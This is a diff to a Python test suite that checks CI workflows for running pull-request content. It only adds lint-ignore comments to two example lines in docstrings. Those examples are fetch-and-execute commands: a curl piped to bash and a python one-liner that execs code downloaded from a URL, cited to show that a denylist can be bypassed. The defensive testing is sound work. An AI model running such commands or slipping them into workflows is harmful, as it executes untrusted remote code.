@@ -1412,7 +1412,7 @@ class TestStage1RunsNoPullRequestContent(unittest.TestCase):
         Every other test in this class forbids a SHAPE. None of them bounds the
         SET. A step running
 
-            curl -fsSL https://raw.githubusercontent.com/x/y/z/setup.sh | bash
+            curl -fsSL https://raw.githubusercontent.com/x/y/z/setup.sh | bash  # @lint-ignore
 
         has no checkout, no `ref:`, no `${{ }}`, no workspace path, no secret
         and no unpinned `uses:` — it passes every prohibition above and
@@ -1533,7 +1533,7 @@ class TestStage1RunsNoPullRequestContent(unittest.TestCase):
         WHAT they run. One line inside the existing capture script —
 
             python3 -c 'import urllib.request;
-                        exec(urllib.request.urlopen("https://x/p.py").read())'
+                        exec(urllib.request.urlopen("https://x/p.py").read())'  # @lint-ignore
 
         — adds no step, no job key and no workflow expression, and matches no
         token in the denylist below. Every other check in this class passes.
